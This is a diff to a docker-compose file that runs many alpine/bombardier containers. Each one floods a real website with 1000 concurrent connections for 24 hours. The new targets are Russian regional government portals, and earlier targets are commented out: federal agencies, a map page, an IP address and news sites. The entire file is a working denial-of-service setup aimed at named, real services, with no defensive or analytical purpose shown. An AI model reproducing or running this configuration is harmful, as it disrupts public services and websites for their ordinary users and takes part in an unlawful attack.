@@ -2,59 +2,94 @@ version: "3.9"
 services:
         media_1:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://wikimapia.org/#lang=en&lat=50.584800&lon=30.489800&z=12&m=w&tag=516"
+                command: "-c 1000 -t 2s -l -d 24h https://www.astrobl.ru"
         media_2:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://185.169.155.16"
+                command: "-c 1000 -t 2s -l -d 24h https://www.volgograd.ru"
         media_3:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://www.admoblkaluga.ru"
         media_4:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://apparat.lenobl.ru"
         media_5:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://mosreg.ru"
         media_6:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://orel-region.ru"
         media_7:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
+                command: "-c 1000 -t 2s -l -d 24h http://midural.ru"
         media_8:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
+                command: "-c 1000 -t 2s -l -d 24h http://www.tula.ru"
         media_9:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://ulgov.ru"
         media_10:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://cheladmin.ru"
         media_11:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
+                command: "-c 1000 -t 2s -l -d 24h https://krd.ru"
         media_12:
                 image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
-        media_13:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
-        media_14:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
-        media_15:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
-        media_16:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
-        media_17:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
-        media_18:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
-        media_19:
-                image: alpine/bombardier
-                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
-
+                command: "-c 1000 -t 2s -l -d 24h https://www.stavregion.ru"
+#        media_13:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://wikimapia.org/#lang=en&lat=50.584800&lon=30.489800&z=12&m=w&tag=516"
+#        media_14:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://185.169.155.16"
+#        media_15:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
+#        media_16:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
+#        media_17:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
+#        media_18:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
+#        media_19:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
+#        media_20:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
+#        media_21:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
+#        media_22:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
+#        media_23:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
+#        media_24:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
+#        media_25:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
+#        media_26:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
+#        media_27:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
+#        media_28:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
+#        media_29:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
+#        media_30:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
+#        media_31:
+#                image: alpine/bombardier
+#                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
